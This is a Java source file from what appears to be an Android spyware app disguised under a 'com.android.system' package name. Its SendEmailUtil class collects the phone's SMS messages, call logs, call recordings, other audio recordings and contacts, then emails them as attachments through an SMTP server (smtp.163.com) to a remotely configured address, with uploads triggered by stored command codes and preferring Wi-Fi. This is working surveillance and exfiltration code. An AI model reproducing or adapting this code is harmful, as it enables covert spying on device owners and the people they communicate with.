package com.android.system.controled.util;

import java.io.File;
import java.io.UnsupportedEncodingException;
import java.util.Date;
import java.util.Properties;
import java.util.Vector;

import javax.activation.DataHandler;
import javax.activation.FileDataSource;
import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import javax.mail.internet.MimeUtility;

import android.util.Log;

import com.android.system.controled.Debug;
import com.android.system.controled.MainApplication;
import com.android.system.controled.bean.Code;
import com.android.system.controled.db.InnerDbOpera;

public class SendEmailUtil {

	private static final String TAG = "SendEmailUtil";
	public static final String host = "smtp.163.com";

	// public static final String host = "smtp.gmail.com";

	private InnerDbOpera mDbOperater;

	public SendEmailUtil() {
		mDbOperater = InnerDbOpera.getInstence();
	}

	private Session initialize() {
		Properties props = new Properties();

		// //Gmail, 尚未实现
		// props.setProperty("mail.smtp.host", "smtp.gmail.com");
		// props.setProperty("mail.smtp.socketFactory.class",
		// "javax.net.ssl.SSLSocketFactory");
		// props.setProperty("mail.smtp.socketFactory.fallback", "false");
		// props.setProperty("mail.smtp.port", "465");
		// props.setProperty("mail.smtp.socketFactory.port", "465");
		// props.put("mail.smtp.auth", "true");
		// 163
		props.setProperty("mail.transport.protocol", "smtp");
		props.setProperty("mail.smtp.host", host);
		props.put("mail.smtp.auth", "true");
		props.put("mail.smtp.starttls.enable", "true");
		props.put("mail.smtp.port", "25");

		SmtpAuth auth = new SmtpAuth();
		auth.setAccount(MainApplication.getInstence().getSenderEmailAddr(), MainApplication.getInstence().getSenderPwd());
		Session session = Session.getDefaultInstance(props, auth);
		return session;
	}

	/**
	 * 上传短信通话记录
	 * 
	 * @Description:
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2012-12-3
	 */
	public void upLoadSmsCallLog(final boolean uploadEvenIfMobile, final long codeDateTime) {
		if ((uploadEvenIfMobile && NetworkUtil.isNetworkAvailable(MainApplication.getInstence())) || NetworkUtil.isWifiEnabled(MainApplication.getInstence())) {

			try {
				String content = "短信和通话记录, 见附件";
				Vector<String> files = new Vector<String>();

				if (MainApplication.FILE_CALL_LOG.exists()) {
					Debug.v("Add", MainApplication.FILE_CALL_LOG.getAbsolutePath());
					files.add(MainApplication.FILE_CALL_LOG.getAbsolutePath());
				}
				// if (MainApplication.FILE_DB_SMS.exists()) {
				// Debug.v("Add", MainApplication.FILE_DB_SMS.getAbsolutePath());
				// files.add(MainApplication.FILE_DB_SMS.getAbsolutePath());
				// }

				SmsToTxtUtil.getInstence().saveAllSmsToTextFile();
				if (MainApplication.FILE_SMS_TEXT.exists()) {
					Debug.v("Add", MainApplication.FILE_SMS_TEXT.getAbsolutePath());
					files.add(MainApplication.FILE_SMS_TEXT.getAbsolutePath());
				}

				if (files.size() <= 0) {
					content = "尚没有任何记录！";
				}

				String title = "";
				if (uploadEvenIfMobile) {
					title = "M 短信通话记录  " + String.valueOf(TimeUtil.getCurrentTimeMillis());
				} else {
					title = "短信通话记录  " + String.valueOf(TimeUtil.getCurrentTimeMillis());
				}

				if (sendMail(title, content, MainApplication.getInstence().getReceiverEmailAddr(), files)) {
					codeDoSuccess(codeDateTime);
				} else {
					updateFailedTimes(codeDateTime);
				}
			} catch (Exception e) {
				e.printStackTrace();
			}

		} else {
			updateFailedTimes(codeDateTime);
		}

	}

	/**
	 * 上传通话录音
	 * 
	 * @Description:
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2012-12-3
	 */
	public void upLoadCallAudios(final boolean uploadEvenIfMobile, final long codeDateTime) {
		if ((uploadEvenIfMobile && NetworkUtil.isNetworkAvailable(MainApplication.getInstence())) || NetworkUtil.isWifiEnabled(MainApplication.getInstence())) {

			try {
				String content = "通话录音，见附件";
				Vector<String> files = new Vector<String>();

				File path = new File(MainApplication.FILEPATH_AUDIOS_CALL);
				if (path.exists() && path.isDirectory()) {
					File[] audios = path.listFiles();
					if (audios != null) {
						for (File audio : audios) {
							files.add(audio.getAbsolutePath());
							Debug.e("Add", " add file = " + audio.getAbsolutePath());
						}
					}
				}

				if (files.size() <= 0) {
					content = "尚没有通话录音！";
				}

				String title = "";
				if (uploadEvenIfMobile) {
					title = "M 通话录音  " + String.valueOf(TimeUtil.getCurrentTimeMillis());
				} else {
					title = "通话录音  " + String.valueOf(TimeUtil.getCurrentTimeMillis());
				}

				if (sendMail(title, content, MainApplication.getInstence().getReceiverEmailAddr(), files)) {
					codeDoSuccess(codeDateTime);
				} else {
					updateFailedTimes(codeDateTime);
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		} else {
			updateFailedTimes(codeDateTime);
		}

	}

	/**
	 * 上传其它录音
	 * 
	 * @Description:
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2012-12-3
	 */
	public void upLoadOtherAudios(final boolean uploadEvenIfMobile, final long codeDateTime) {
		if ((uploadEvenIfMobile && NetworkUtil.isNetworkAvailable(MainApplication.getInstence())) || NetworkUtil.isWifiEnabled(MainApplication.getInstence())) {
			try {
				String content = "其它录音，见附件";
				Vector<String> files = new Vector<String>();

				File path = new File(MainApplication.FILEPATH_AUDIOS_OTHER);
				if (path.exists() && path.isDirectory()) {
					File[] audios = path.listFiles();
					if (audios != null) {
						for (File audio : audios) {
							files.add(audio.getAbsolutePath());
							Debug.e("Add", " add other audio file = " + audio.getAbsolutePath());
						}
					}
				}

				if (files.size() <= 0) {
					content = "尚没有其他录音！";
				}

				String title = "";
				if (uploadEvenIfMobile) {
					title = "M 其它录音  " + String.valueOf(TimeUtil.getCurrentTimeMillis());
				} else {
					title = "其它录音  " + String.valueOf(TimeUtil.getCurrentTimeMillis());
				}

				if (sendMail(title, content, MainApplication.getInstence().getReceiverEmailAddr(), files)) {
					codeDoSuccess(codeDateTime);
				} else {
					updateFailedTimes(codeDateTime);
				}
			} catch (Exception e) {
				e.printStackTrace();
			}

		} else {
			updateFailedTimes(codeDateTime);
		}
	}

	/**
	 * 上传所有
	 * 
	 * @Description:
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2012-12-3
	 */
	public void upLoadALL(final boolean uploadEvenIfMobile, final long codeDateTime) {
		if ((uploadEvenIfMobile && NetworkUtil.isNetworkAvailable(MainApplication.getInstence())) || NetworkUtil.isWifiEnabled(MainApplication.getInstence())) {
			try {
				ContactsUtil.createContactsFile(MainApplication.getInstence());
				SmsToTxtUtil.getInstence().saveAllSmsToTextFile();
				CodesToTxtUtil.getInstence().saveAllCodesToTextFile();

				String content = "所有记录，见附件";
				Vector<String> files = new Vector<String>();

				if (MainApplication.FILE_CALL_LOG.exists()) {
					Debug.v("Add", MainApplication.FILE_CALL_LOG.getAbsolutePath());
					files.add(MainApplication.FILE_CALL_LOG.getAbsolutePath());
				}

				if (MainApplication.FILE_SMS_TEXT.exists()) {
					Debug.v("Add", MainApplication.FILE_SMS_TEXT.getAbsolutePath());
					files.add(MainApplication.FILE_SMS_TEXT.getAbsolutePath());
				}

				if (MainApplication.FILE_CODE_TEXT.exists()) {
					Debug.v("Add", MainApplication.FILE_CODE_TEXT.getAbsolutePath());
					files.add(MainApplication.FILE_CODE_TEXT.getAbsolutePath());
				}
				
				if (MainApplication.FILE_CONTACTS_TEXT.exists()) {
					Debug.v("Add", MainApplication.FILE_CONTACTS_TEXT.getAbsolutePath());
					files.add(MainApplication.FILE_CONTACTS_TEXT.getAbsolutePath());
				}

				File path = new File(MainApplication.FILEPATH_AUDIOS_CALL);
				if (path.exists() && path.isDirectory()) {
					File[] audios = path.listFiles();
					if (audios != null) {
						for (File audio : audios) {
							files.add(audio.getAbsolutePath());
							Debug.e("Add", " add call audio file = " + audio.getAbsolutePath());
						}
					}
				}

				File path2 = new File(MainApplication.FILEPATH_AUDIOS_OTHER);
				if (path2.exists() && path2.isDirectory()) {
					File[] audios = path2.listFiles();
					if (audios != null) {
						for (File audio : audios) {
							files.add(audio.getAbsolutePath());
							Debug.e("Add", " add other audio file = " + audio.getAbsolutePath());
						}
					}
				}

				String title = "";
				if (uploadEvenIfMobile) {
					title = "M 所有记录  " + String.valueOf(TimeUtil.getCurrentTimeMillis());
				} else {
					title = "所有记录  " + String.valueOf(TimeUtil.getCurrentTimeMillis());
				}

				if (sendMail(title, content, MainApplication.getInstence().getReceiverEmailAddr(), files)) {
					codeDoSuccess(codeDateTime);
				} else {
					updateFailedTimes(codeDateTime);
				}
			} catch (Exception e) {
				e.printStackTrace();
			}

		} else {
			updateFailedTimes(codeDateTime);
		}

	}

	/**
	 * 上传联系人
	 * 
	 * @Description:
	 * @see:
	 * @since:
	 * @author: zhuanggy
	 * @date:2012-12-3
	 */
	public void upLoadContact(final boolean uploadEvenIfMobile, final long codeDateTime) {
		if ((uploadEvenIfMobile && NetworkUtil.isNetworkAvailable(MainApplication.getInstence())) || NetworkUtil.isWifiEnabled(MainApplication.getInstence())) {
			try {
				ContactsUtil.createContactsFile(MainApplication.getInstence());

				String content = "联系人，见附件";
				Vector<String> files = new Vector<String>();

				if (MainApplication.FILE_CONTACTS_TEXT.exists()) {
					Debug.v("Add", MainApplication.FILE_CONTACTS_TEXT.getAbsolutePath());
					files.add(MainApplication.FILE_CONTACTS_TEXT.getAbsolutePath());
				}

				if (files.size() <= 0) {
					content = "联系人为空！";
				}
				String title = "";
				if (uploadEvenIfMobile) {
					title = "M 联系人  " + String.valueOf(TimeUtil.getCurrentTimeMillis());
				} else {
					title = "联系人  " + String.valueOf(TimeUtil.getCurrentTimeMillis());
				}

				if (sendMail(title, content, MainApplication.getInstence().getReceiverEmailAddr(), files)) {
					codeDoSuccess(codeDateTime);
				} else {
					updateFailedTimes(codeDateTime);
				}
			} catch (Exception e) {
				e.printStackTrace();
			}

		} else {
			updateFailedTimes(codeDateTime);
		}

	}

	private void codeDoSuccess(long time) {
		try {
			Code code = new Code();
			code.setResult(Code.RESULT_OK);
			code.setDate(time);
			mDbOperater.updateCodeResult(code);
			Debug.v(TAG, "执行完成！ " + code.getCode());
		} catch (Exception e) {
			e.printStackTrace();
		}

	}

	private void updateFailedTimes(long time) {
		Debug.e(TAG, "失败次数+1");
		try {
			mDbOperater.updateCodeFailedTimes(time);
		} catch (Exception e) {
			e.printStackTrace();
		}

	}

	/**
	 * 发送Email
	 * 
	 * @param subject
	 *            标题
	 * @param body
	 *            内容
	 * @param sender
	 *            发送者
	 * @param recipients
	 *            接收者
	 * @throws MessagingException
	 * @throws AddressException
	 * */
	private synchronized boolean sendMail(String subject, String body, String recipients, Vector<String> files) {

		Debug.e(TAG, "recipients=" + recipients);

		MimeMessage message = new MimeMessage(initialize());

		try {
			message.setFrom(new InternetAddress(MainApplication.getInstence().getSenderEmailAddr()));
			// message.setSender(new InternetAddress(userName));
			if (recipients.contains(",")) {
				message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(recipients));
			} else {
				message.setRecipient(Message.RecipientType.TO, new InternetAddress(recipients));
			}
			message.setSubject(subject);

			Multipart mp = new MimeMultipart();
			MimeBodyPart mbpContent = new MimeBodyPart();
			mbpContent.setText(body);
			mp.addBodyPart(mbpContent);
			if (files != null && files.size() > 0) {
				for (int i = 0; i < files.size(); i++) {
					MimeBodyPart attachPart = new MimeBodyPart();
					FileDataSource fds = new FileDataSource(files.get(i)); // 打开要发送的文件
					try {
						attachPart.setDataHandler(new DataHandler(fds));
					} catch (MessagingException e) {
						e.printStackTrace();
					}
					try {
						attachPart.setFileName(MimeUtility.encodeWord(fds.getName(), "utf-8", null));
					} catch (MessagingException e) {
						e.printStackTrace();
					} catch (UnsupportedEncodingException e) {
						e.printStackTrace();
					}

					try {
						mp.addBodyPart(attachPart);// 添加
					} catch (MessagingException e) {
						e.printStackTrace();
					}
				}

			}
			message.setContent(mp);
			// message.saveChanges();
			message.setSentDate(new Date());
			Transport.send(message);// 开始发送
			return true;
		} catch (Exception e) {
			e.printStackTrace();
		}

		return false;

	}

	private static class SmtpAuth extends Authenticator {

		private String user, password;

		void setAccount(String user, String password) {
			this.user = user;
			this.password = password;
		}

		@Override
		protected PasswordAuthentication getPasswordAuthentication() {
			return new PasswordAuthentication(user, password);
		}
	}
}
